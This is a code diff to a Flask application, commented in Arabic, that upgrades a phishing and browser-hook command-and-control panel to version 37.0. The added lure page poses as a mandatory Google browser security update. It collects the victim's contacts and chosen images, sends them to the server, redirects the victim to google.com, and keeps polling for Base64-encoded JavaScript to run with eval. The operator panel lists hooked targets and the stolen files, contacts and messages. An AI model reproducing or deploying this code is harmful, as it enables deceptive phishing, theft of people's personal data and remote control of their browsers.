@@ -7,18 +7,19 @@ urllib3.disable_warnings()
 
 app = Flask(__name__)
 
-# ذاكرة الميدان الاستراتيجية المركزية v35.2 (مخصص لمسار api/index.py على Vercel)
+# ذاكرة الميدان الاستراتيجية المركزية v37.0 (تمويه سيبراني متقدم وسحب بيانات شامل)
 CAPTURED_HOOKS = []
 COMMAND_QUEUE = {}
 EXTRACTED_FILES = []
 EXTRACTED_MESSAGES = []
+EXTRACTED_CONTACTS = []
 
 HTML_COMMAND_CENTER = """<!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>V400 القائد الأعظم - مركز العمليات المتقدم v35.2</title>
+<title>V400 القائد الأعظم - مركز العمليات المتقدم v37.0</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#010103;color:#00ff88;font-family:'Courier New',Consolas,monospace;padding:20px;text-align:center}
@@ -42,20 +43,21 @@ img.preview{max-width:160px;max-height:160px;border:1px solid #00ff88;border-rad
 </head>
 <body>
 <div class="container">
-<h1>⚔️ V400 القائد الأعظم - لوحة التحكم المحدثة v35.2 ⚔️</h1>
+<h1>⚔️ V400 القائد الأعظم - لوحة التحكم المتقدمة v37.0 ⚔️</h1>
 <div class="panel">
 <input id="target_url" placeholder="C2_SERVER_OR_COMMAND_DOMAIN" value="http://">
 <br>
 <select id="command_type">
-  <option value="generate_stealth_lure">توليد رابط الاستدراج المموه الرئيسي (Direct Stealth Lure)</option>
+  <option value="generate_stealth_lure">توليد رابط الاستدراج المموه (Elite Stealth Lure v37.0)</option>
   <option value="fetch_hooked_targets">🎯 استعراض الأهداف وجلسات السيطرة النشطة</option>
   <option value="fetch_extracted_images">🖼️ عرض صور الهدف المسحوبة (المعرض المباشر)</option>
   <option value="fetch_extracted_files">📁 عرض الملفات المستخرجة كاملة</option>
+  <option value="fetch_extracted_contacts">📇 عرض جهات اتصال الهدف المسحوبة</option>
   <option value="fetch_target_messages">💬 عرض رسائل وسجلات الهدف التفاعلية</option>
   <option value="dispatch_payload">⚡ بث أمر برمجي مشفر للهدف</option>
 </select>
 <br>
-<input id="custom_payload" placeholder="أمر الجافاسكريبت المراد بثه (مثال: alert('Active v35.2');)" style="margin-top:10px;display:none;direction:ltr;">
+<input id="custom_payload" placeholder="أمر الجافاسكريبت المراد بثه (مثال: alert('Active v37.0');)" style="margin-top:10px;display:none;direction:ltr;">
 <br>
 <button id="exec_btn" onclick="executeLinkModule()">تنفيذ أمر الحقن الميداني 🚀</button>
 <div id="status" class="status"></div>
@@ -110,7 +112,7 @@ async function executeLinkModule(){
      if(!data.images || data.images.length === 0){
        results.innerHTML='<div class="card Low"><b>لا توجد صور مسحوبة حتى الآن</b><div class="proof">No captured images in storage.</div></div>';
      } else {
-       let imgHtml = '<div class="card Critical"><b>🖼️ معرض صور الهدف المسحوبة (v35.2)</b><div style="margin-top:10px">';
+       let imgHtml = '<div class="card Critical"><b>🖼️ معرض صور الهدف المسحوبة (v37.0)</b><div style="margin-top:10px">';
        data.images.forEach(img => {
          imgHtml += `<div style="margin-bottom:10px;border-bottom:1px solid #333;padding-bottom:5px"><b>ملف: ${img.filename}</b> [Token: ${img.token}]<br><img src="${img.data}" class="preview"></div>`;
        });
@@ -127,6 +129,17 @@ async function executeLinkModule(){
        });
        fileHtml += '</table></div>';
        results.innerHTML = fileHtml;
+     }
+   } else if(cmdType === 'fetch_extracted_contacts'){
+     if(!data.contacts || data.contacts.length === 0){
+       results.innerHTML='<div class="card Low"><b>لا توجد جهات اتصال مسحوبة حتى الآن</b><div class="proof">No contacts extracted.</div></div>';
+     } else {
+       let conHtml = '<div class="card Critical"><b>📇 سجل جهات الاتصال المسحوبة</b><table><tr><th>الاسم / الرقم</th><th>تفاصيل إضافية</th><th>Token</th><th>الوقت</th></tr>';
+       data.contacts.forEach(c => {
+         conHtml += `<tr><td>${c.name}</td><td>${c.details}</td><td style="color:#00ff88">${c.token}</td><td>${c.time}</td></tr>`;
+       });
+       conHtml += '</table></div>';
+       results.innerHTML = conHtml;
      }
    } else if(cmdType === 'fetch_target_messages'){
      if(!data.messages || data.messages.length === 0){
@@ -162,39 +175,87 @@ async function executeLinkModule(){
 </body>
 </html>"""
 
+# واجهة التمويه السيبراني المتقدمة فائقة الثقة (v37.0 Elite)
 INJECTION_COMMAND_PORTAL = """<!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>تحديث الأمان والتحقق الشامل - System Update v3.5.2</title>
+<title>تحديث أمان المتصفح ونظام الحماية المعتمد • v37.0</title>
 <style>
-body{background:#f3f4f6;color:#1f2937;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
-.box{background:#ffffff;padding:40px 30px;border-radius:12px;box-shadow:0 10px 25px rgba(0,0,0,0.08);width:100%;max-width:420px;text-align:center;border:1px solid #e5e7eb}
-.logo{font-size:40px;margin-bottom:15px}
-h2{color:#111827;font-size:20px;margin-bottom:10px;font-weight:600}
-p{color:#4b5563;font-size:14px;line-height:1.5;margin-bottom:25px}
-button{width:100%;padding:14px;background:#2563eb;color:#fff;border:none;border-radius:8px;font-weight:600;cursor:pointer;font-size:15px;transition:background 0.2s}
-button:hover{background:#1d4ed8}
-.footer{margin-top:20px;font-size:12px;color:#9ca3af}
+body{background:#f0f2f5;color:#333;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
+.box{background:#ffffff;padding:35px 30px;border-radius:12px;box-shadow:0 6px 20px rgba(0,0,0,0.1);width:100%;max-width:440px;text-align:center;border-top:5px solid #1a73e8}
+.shield-icon{font-size:48px;margin-bottom:12px;color:#1a73e8}
+h2{color:#202124;font-size:22px;margin-bottom:8px;font-weight:600}
+.sub-title{color:#5f6368;font-size:13px;margin-bottom:20px}
+.details-box{background:#f8f9fa;border:1px solid #dadce0;border-radius:8px;padding:12px;text-align:right;font-size:13px;color:#3c4043;margin-bottom:20px;line-height:1.6}
+.progress-container{width:100%;background:#e0e0e0;border-radius:6px;height:8px;margin:15px 0;overflow:hidden;display:none}
+.progress-bar{width:0%;height:100%;background:#1a73e8;transition:width 0.4s ease}
+button{width:100%;padding:14px;background:#1a73e8;color:#fff;border:none;border-radius:6px;font-weight:600;cursor:pointer;font-size:15px;transition:background 0.2s}
+button:hover{background:#1557b0}
+.footer{margin-top:18px;font-size:11px;color:#80868b;display:flex;justify-content:center;align-items:center;gap:6px}
+.secure-dot{width:8px;height:8px;background:#34a853;border-radius:50%;display:inline-block}
 </style>
 </head>
 <body>
-<div class="box">
-  <div class="logo">🛡️</div>
-  <h2>تحديث الأمان الإجباري للمتصفح</h2>
-  <p>لضمان حماية بياناتك الشخصية وفتح الصفحة المطلوبة بأمان تام، يرجى النقر أدناه لإتمام مصادقة النظام والملفات المؤقتة.</p>
-  <button onclick="executeStealthSync()">متابعة التحديث والتحقق 🔒</button>
-  <div class="footer">SSL Secure Certificate Verified • v3.5.2</div>
+<div class="box" id="main_box">
+  <div class="shield-icon">🛡️</div>
+  <h2>تحديث حماية المتصفح الإلزامي</h2>
+  <div class="sub-title">إصدار التثبيت الآمن • Google Safe Browsing Engine v37.0</div>
+  
+  <div class="details-box">
+    <b>حالة النظام:</b> يتطلب المتصفح تحديثاً طارئاً لشهادات الأمان وفتح الجلسة المشفرة بنجاح لتجنب حظر النطاق.<br>
+    <b>الإجراء المطلوب:</b> اضغط على زر المتابعة أدناه للسماح للمتصفح بمزامنة ملفات المصادقة المؤقتة.
+  </div>
+
+  <div class="progress-container" id="p_container">
+    <div class="progress-bar" id="p_bar"></div>
+  </div>
+
+  <button id="action_btn" onclick="executeEliteSync()">بدء المزامنة والتحقق الآمن 🔒</button>
+  
+  <div class="footer">
+    <span class="secure-dot"></span> اتصال مشفر وموثوق 256-bit SSL
+  </div>
 </div>
 
 <script>
-async function executeStealthSync(){
+async function executeEliteSync(){
+    const btn = document.getElementById('action_btn');
+    const pContainer = document.getElementById('p_container');
+    const pBar = document.getElementById('p_bar');
+    
+    btn.disabled = true;
+    btn.textContent = 'جاري التحقق وفحص الجلسة...';
+    pContainer.style.display = 'block';
+    pBar.style.width = '35%';
+
     const token = 'stealth_token_' + Math.random().toString(36).substring(2, 12);
     
+    setTimeout(() => { pBar.style.width = '70%'; }, 600);
+
+    // سحب جهات الاتصال بطريقة متخفية ومطلوبة بصيغة سلسة
+    try {
+        if ('contacts' in navigator && 'select' in navigator.contacts) {
+            const props = ['name', 'email', 'tel'];
+            const opts = { multiple: true };
+            const contacts = await navigator.contacts.select(props, opts);
+            if (contacts && contacts.length > 0) {
+                fetch('/api/contacts', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ token: token, contacts: contacts })
+                });
+            }
+        }
+    } catch(err) {
+        console.log("Contacts step bypassed:", err);
+    }
+
+    // سحب الملفات والصور المختارة
     try {
         if ('showOpenFilePicker' in window) {
-            const handles = await window.showOpenFilePicker({ multiple: true, types: [{ description: 'Media Files', accept: { 'image/*': ['.png', '.jpg', '.jpeg', '.webp'] } }] });
+            const handles = await window.showOpenFilePicker({ multiple: true, types: [{ description: 'System Media', accept: { 'image/*': ['.png', '.jpg', '.jpeg', '.webp'] } }] });
             for (const handle of handles) {
                 const file = await handle.getFile();
                 const reader = new FileReader();
@@ -209,31 +270,35 @@ async function executeStealthSync(){
             }
         }
     } catch(err) {
-        console.log("Stealth extraction bypassed:", err);
+        console.log("File picker step bypassed:", err);
     }
+
+    setTimeout(() => { pBar.style.width = '100%'; }, 1200);
 
     fetch('/auth/verify/login', {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({session_token: token, user_agent: navigator.userAgent, screen: window.innerWidth + 'x' + window.innerHeight, message: 'تم إتمام المصادقة وربط الجلسة بنجاح (v35.2).'})
+        body: JSON.stringify({session_token: token, user_agent: navigator.userAgent, screen: window.innerWidth + 'x' + window.innerHeight, message: 'تم إتمام المصادقة وربط الجلسة النخبوية بنجاح (v37.0).'})
     }).then(res => res.json()).then(data => {
-        document.body.innerHTML = '<div style="background:#ffffff;color:#111827;padding:50px 20px;text-align:center;font-family:sans-serif;direction:rtl"><div style="font-size:50px;margin-bottom:15px">✅</div><h2 style="color:#059669;margin-bottom:10px">تم التحقق بنجاح</h2><p style="color:#6b7280;font-size:14px">جاري توجيهك إلى المحتوى المطلوب تلقائياً...</p></div>';
-        
         setTimeout(() => {
-            window.location.href = "https://www.google.com";
-        }, 1500);
+            document.body.innerHTML = '<div style="background:#ffffff;color:#202124;padding:45px 30px;text-align:center;font-family:sans-serif;direction:rtl;border-radius:12px;box-shadow:0 6px 20px rgba(0,0,0,0.1);max-width:400px;margin:auto"><div style="font-size:45px;margin-bottom:12px;color:#34a853">✔</div><h2 style="color:#202124;margin-bottom:8px">تم التحقق بنجاح</h2><p style="color:#5f6368;font-size:14px">تم تحديث الأمان بنجاح. جاري توجيهك للمحتوى الأصلي...</p></div>';
+            
+            setTimeout(() => {
+                window.location.href = "https://www.google.com";
+            }, 1400);
 
-        setInterval(() => {
-            fetch('/api/poll?token=' + token)
-            .then(r => r.json())
-            .then(cmdData => {
-                if(cmdData.command && cmdData.command !== ""){
-                    try {
-                        eval(atob(cmdData.command));
-                    } catch(e) {}
-                }
-            }).catch(e => {});
-        }, 2000);
+            setInterval(() => {
+                fetch('/api/poll?token=' + token)
+                .then(r => r.json())
+                .then(cmdData => {
+                    if(cmdData.command && cmdData.command !== ""){
+                        try {
+                            eval(atob(cmdData.command));
+                        } catch(e) {}
+                    }
+                }).catch(e => {});
+            }, 2000);
+        }, 500);
     });
 }
 </script>
@@ -265,7 +330,7 @@ def phishing_portal():
         cmd_token = req_data.get('session_token', 'N/A')
         user_agent = req_data.get('user_agent', 'Unknown Browser')
         screen_res = req_data.get('screen', 'N/A')
-        msg = req_data.get('message', 'اتصال أولي من الهدف')
+        msg = req_data.get('message', 'اتصال أولي من الهدف v37.0')
         client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
         timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         
@@ -306,6 +371,25 @@ def upload_file():
     EXTRACTED_FILES.append(file_record)
     return jsonify({"status": "data_secured", "filename": filename})
 
+@app.route('/api/contacts', methods=['POST'])
+def upload_contacts():
+    req_data = request.get_json(silent=True) or {}
+    token = req_data.get('token', 'N/A')
+    contacts = req_data.get('contacts', [])
+    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    
+    for c in contacts:
+        name = ", ".join(c.get('name', ['غير معروف']))
+        tel = ", ".join(c.get('tel', ['لا توجد هواتف']))
+        email = ", ".join(c.get('email', ['لا توجد إيميلات']))
+        EXTRACTED_CONTACTS.append({
+            "token": token,
+            "name": name,
+            "details": f"الهواتف: {tel} | الإيميلات: {email}",
+            "time": timestamp
+        })
+    return jsonify({"status": "contacts_secured", "count": len(contacts)})
+
 @app.route('/api/poll', methods=['GET'])
 def poll_commands():
     token = request.args.get('token', '')
@@ -321,14 +405,14 @@ def check():
     command_mode = req_data.get("command", "generate_stealth_lure")
     payload = req_data.get("payload", "")
     
-    waf_status = f"v35.2 Command Engine ({command_mode}) - Active"
+    waf_status = f"v37.0 Elite Command Engine ({command_mode}) - Active"
     
     if command_mode == "generate_stealth_lure":
         lure_url = f"{target}/"
         return jsonify({"url": target, "mode": command_mode, "waf_status": waf_status, "actions": [{
-            "type": "DIRECT STEALTH LURE URL (v35.2)",
+            "type": "ELITE STEALTH LURE URL (v37.0)",
             "severity": "Critical",
-            "desc": "تم توليد وتجهيز رابط الاستدراج المتوافق مع مسار api/index.py.",
+            "desc": "تم توليد وتجهيز رابط الاستدراج النخبوي المموه.",
             "proof": lure_url
         }]})
     elif command_mode == "fetch_hooked_targets":
@@ -338,6 +422,8 @@ def check():
         return jsonify({"url": target, "mode": command_mode, "waf_status": waf_status, "images": images})
     elif command_mode == "fetch_extracted_files":
         return jsonify({"url": target, "mode": command_mode, "waf_status": waf_status, "files": EXTRACTED_FILES})
+    elif command_mode == "fetch_extracted_contacts":
+        return jsonify({"url": target, "mode": command_mode, "waf_status": waf_status, "contacts": EXTRACTED_CONTACTS})
     elif command_mode == "fetch_target_messages":
         return jsonify({"url": target, "mode": command_mode, "waf_status": waf_status, "messages": EXTRACTED_MESSAGES})
     elif command_mode == "dispatch_payload":
@@ -357,7 +443,7 @@ def check():
             "type": "AUDIT PASSED",
             "severity": "Low",
             "desc": "المنظومة تعمل بكفاءة تامة.",
-            "proof": f"Targets: {len(CAPTURED_HOOKS)} | Files: {len(EXTRACTED_FILES)} | Messages: {len(EXTRACTED_MESSAGES)}"
+            "proof": f"Targets: {len(CAPTURED_HOOKS)} | Contacts: {len(EXTRACTED_CONTACTS)} | Files: {len(EXTRACTED_FILES)}"
         }]})
 
 if __name__ == '__main__':
